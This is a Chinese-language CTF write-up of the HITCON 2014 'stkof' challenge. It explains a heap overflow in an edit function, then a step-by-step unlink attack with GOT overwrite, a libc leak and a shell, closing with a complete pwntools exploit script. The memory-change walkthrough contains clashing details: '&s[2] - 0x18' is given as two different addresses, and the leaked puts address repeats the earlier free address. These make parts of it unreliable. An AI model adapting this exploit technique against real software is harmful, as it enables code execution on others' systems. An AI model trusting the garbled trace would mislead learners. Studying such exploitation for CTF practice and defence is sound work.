# 漏洞成因
## 程序关键结构体
程序使用一个全局的指针数组 `::s`（位于 `0x602140`）来管理用户分配的堆块指针。同时使用一个全局整数 `dword_602100` 来记录当前已分配的堆块数量，该值从1开始递增，作为堆块的索引返回给用户。
```c
// 伪代码表示
void *s[?]; // 0x602140
int alloc_count; // 0x602100
```

## 漏洞定位
程序的漏洞存在于编辑功能 `sub_4009E8` 中。该函数允许用户指定一个索引和一个要写入的字节数 `n`，然后使用 `fread` 循环读入，直到读满 `n` 个字节。但是，该函数**并未检查用户传入的 `n` 是否超过了对应堆块实际分配的大小**。结合特定的堆布局，攻击者可以利用此漏洞构造 **堆溢出（Heap Overflow）**，覆盖相邻堆块的关键元数据（如 `size` 和 `prev_size`），进而触发 **Unlink** 攻击。
```c
__int64 sub_4009E8()
{
  // ...
  fgets(s, 16, stdin);
  n = atoll(s); // 用户可控的输入大小 `n`
  ptr = (&::s)[v2]; // 根据索引获取堆块指针
  for ( i = fread(ptr, 1u, n, stdin); i > 0; i = fread(ptr, 1u, n, stdin) )
  { // 循环读入，直至读满 `n` 个字节，未进行边界检查
    ptr += i;
    n -= i;
  }
  if ( n ) // 如果没读满，则报错
    return 0xFFFFFFFFLL;
  else
    return 0;
}
```

# 漏洞利用过程：
本漏洞利用的核心是通过堆溢出伪造一个“空闲（free）”的 chunk，然后释放其相邻的下一个 chunk 来触发 **Unlink**。Unlink 操作会将伪造的 chunk 从其所处的双向链表中“摘除”，这个操作会写入特定内存。通过精心构造伪造 chunk 内的 `fd` 和 `bk` 指针，我们可以利用 Unlink 的写入操作**修改全局堆块指针数组 `s` 中的内容**，从而将任意地址（如 `free` 的 GOT 表项）写入该数组。之后，通过编辑功能修改 GOT 表，实现 **GOT Hijacking**，最终劫持控制流获取 shell。

- Step1: 堆布局。分配三个堆块，为后续的溢出和 Unlink 创造条件。
- Step2: 利用编辑功能的溢出漏洞，在 chunk2 的用户数据区伪造一个空闲的 chunk (`fake chunk`)，并溢出修改 chunk3 的 `prev_size` 和 `size` 字段，使堆管理器认为 `fake chunk` 是空闲的且与 chunk3 相邻。
- Step3: 释放 chunk3。这会触发堆的后向合并（backward consolidation）检查。由于 chunk3 的 `prev_inuse` 位被清0，堆管理器会尝试将“空闲”的 `fake chunk` 与 chunk3 合并。在合并前，需要先将 `fake chunk` 从其所在的“空闲链表”中取出，从而触发 **Unlink**。
- Step4: Unlink 操作修改了全局数组 `s` 中 chunk2 的指针。利用编辑功能，通过这个被修改的指针去覆写全局数组 `s` 自身，将其前几项覆盖为 `free`、`puts`、`atoi` 的 GOT 表地址。
- Step5: 将 `free` 的 GOT 表项覆写为 `puts` 的 PLT 地址。这样，调用 `free` 实际上会调用 `puts`。
- Step6: 调用 `free(1)`。此时全局数组 `s[1]` 指向的是 `puts` 的 GOT 表地址，因此实际执行的是 `puts(puts@got)`，泄露了 `puts` 在 libc 中的真实地址。
- Step7: 根据泄露的地址计算 `system` 地址，并将 `atoi` 的 GOT 表项覆写为 `system` 地址。
- Step8: 当程序下一次调用 `atoi` 解析我们的输入时，实际上会调用 `system`。此时我们传入字符串 `"/bin/sh"` 即可获得 shell。

## Step1
**目的：** 初始化堆布局，分配三个连续堆块。
- 分配 chunk1 (idx=1， size=0x100)
- 分配 chunk2 (idx=2， size=0x30)
- 分配 chunk3 (idx=3， size=0x80)

**内存变化：**
- 堆内存 `0x1d39010` 处，分配了大小为 `0x110` (0x100 + 0x10 元数据) 的 chunk1。
- 堆内存 `0x1d39b30` 处，分配了大小为 `0x40` (0x30 + 0x10 元数据) 的 chunk2。
- 堆内存 `0x1d39b80` 处，分配了大小为 `0x90` (0x80 + 0x10 元数据) 的 chunk3。
- 全局变量 `0x602140` (全局数组 `s`)，其内容从 `0` 变为分别指向这三个堆块用户区域起始地址的指针。

## Step2
**目的：** 在 chunk2 的用户数据区构造一个伪造的“空闲” chunk (`fake chunk`)，并溢出修改 chunk3 的元数据。
**内存变化：**
- 堆内存 `0x1d39b40` (chunk2 user data) 处，被构造为 `fake chunk` 的元数据：`prev_size=0`， `size=0x20`。
- 堆内存 `0x1d39b50` 处，被写入 `fake chunk` 的 `fd` 和 `bk` 指针，分别指向 `0x602148` (`&s[2] - 0x18`) 和 `0x602150` (`&s[2] - 0x10`)。
- 堆内存 `0x1d39b70` (chunk3 `prev_size`) 处，内容从 `0` 变为 `0x20`（被溢出覆盖，`fake chunk` 的大小）。
- 堆内存 `0x1d39b78` (chunk3 `size`) 处，内容从 `0x91` 变为 `0x90`（清除了 `prev_inuse` 位）。

## Step3
**目的：** 释放 chunk3，触发 Unlink。
**内存变化：**
- 堆内存 `0x1d39b80` (chunk3) 被释放，其 `fd` 和 `bk` 指针被写入，并入 `unsorted bin`。
- **最关键的变化**：全局变量 `0x602150` (`s[2]`，即指向 chunk2 的指针) 的内容，从 `0x1d39b40` 被修改为 `0x602138` (`&s[2] - 0x18`)。这是 Unlink 操作 `*(fd+0x18) = bk` 和 `*(bk+0x10) = fd` 共同作用的结果。现在，`s[2]` 指向了全局数组 `s` 内部的地址。

## Step4
**目的：** 利用被修改的 `s[2]` 指针，覆写全局数组 `s` 的前几项，使其指向关键的 GOT 表项。
**内存变化：**
- 全局变量 `0x602140` (`s[0]`) 的内容，从 `0x1d39010` 被修改为 `0x602018` (`free@got`)。
- 全局变量 `0x602148` (`s[1]`) 的内容，从 `0x1d39b40` 被修改为 `0x602020` (`puts@got`)。
- 全局变量 `0x602150` (`s[2]`) 的内容，从 `0x602138` 被修改为 `0x602068` (`atoi@got`)。

## Step5
**目的：** 将 `free` 的 GOT 表项修改为 `puts` 的 PLT 地址。
**内存变化：**
- 全局变量 `0x602018` (`free@got`) 处的内容，从 `0x7f8c3e8e1440` (libc中的`free`地址) 被修改为 `0x4006a0` (程序内`puts@plt`的地址)。

## Step6
**目的：** 调用 `free(1)` 触发 `puts(puts@got)`，泄露 libc 地址。
**内存变化：**
- 程序执行流跳转到 `puts@plt`，打印出 `0x7f8c3e8e1440` (`puts` 在 libc 中的地址)。无其他持久性内存变化。

## Step7
**目的：** 计算 `system` 地址，并将 `atoi` 的 GOT 表项修改为 `system` 地址。
**内存变化：**
- 全局变量 `0x602068` (`atoi@got`) 处的内容，从 `0x7f8c3e86c390` (libc中的`atoi`地址) 被修改为 `0x7f8c3e923390` (计算出的`system`地址)。

## Step8
**目的：** 获取 shell。
**内存变化：**
- 当程序在 `main` 函数中再次调用 `atoi` 解析我们的输入时，实际执行 `system`。我们发送字符串 `"/bin/sh"`，`system` 被执行，获得 shell。

# Exploit：
```python
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = process('./data/bin/heap23_00_hitcon_2014_stkof')
elf = ELF('./data/bin/heap23_00_hitcon_2014_stkof')
libc = elf.libc
g_pointer = 0x602140  # 全局堆块指针数组 s 的地址

def alloc(size:int):
    p.sendline(b'1')
    p.sendline(str(size).encode())
    return p.recv()

def edit(idx:int, size:bytes, content:str):
    p.sendline(b'2')
    p.sendline(str(idx).encode())
    p.sendline(str(size).encode())  # 可控的 size 参数，导致堆溢出漏洞
    if type(content)==str:
        p.sendline(content.encode())
    elif type(content)==bytes:
        p.sendline(content)
    return p.recv()

def free(idx):
    p.sendline(b'3')
    p.sendline(str(idx).encode())
    return p.recv()

# Step 1: 堆布局
alloc(0x100)
alloc(0x30)
alloc(0x80)

# Step 2: 在 chunk2 构造 fake chunk 并溢出修改 chunk3
# fake chunk 的 fd 和 bk 指针经过精心构造，以便在 unlink 时修改 s[2] 的指针
payload = p64(0) + p64(0x20) + p64(g_pointer+16-0x18) + p64(g_pointer+16-0x10) + p64(0x20) + b'a'*8 + p64(0x30) + p64(0x90)
edit(2, len(payload), payload)  # 溢出覆盖 chunk3 的 prev_size 和 size

# Step 3: 释放 chunk3，触发 unlink
free(3)

# Step 4: 利用被修改的 s[2] 指针覆写全局数组 s
payload2 = b'b'*8 + p64(elf.got['free']) + p64(elf.got['puts']) + p64(elf.got['atoi'])
edit(2, len(payload2), payload2)  # 现在 s[0], s[1], s[2] 分别指向 free, puts, atoi 的 GOT 表项

# Step 5: 将 free@got 改为 puts@plt
payload3 = p64(elf.plt['puts'])
edit(0, len(payload3), payload3)

# Step 6: 调用 free(1) -> puts(puts@got)，泄露 libc 地址
leak = free(1)  # 返回的字符串中包含泄露的地址
puts_addr = u64(leak[:6].ljust(8, b'\x00'))  # 解析泄露的地址
log.success(f'puts_addr = {hex(puts_addr)}')

# Step 7: 计算 system 地址并覆写 atoi@got
libc.address = puts_addr - libc.sym['puts']
system_addr = libc.sym['system']
payload4 = p64(system_addr)
edit(2, len(payload4), payload4)

# Step 8: 当程序下次调用 atoi 时，实际执行 system("/bin/sh")
p.sendline(b'/bin/sh\x00')  # 发送 /bin/sh 作为下一次 atoi 的“数字”输入，实际上会传给 system
p.interactive()
```
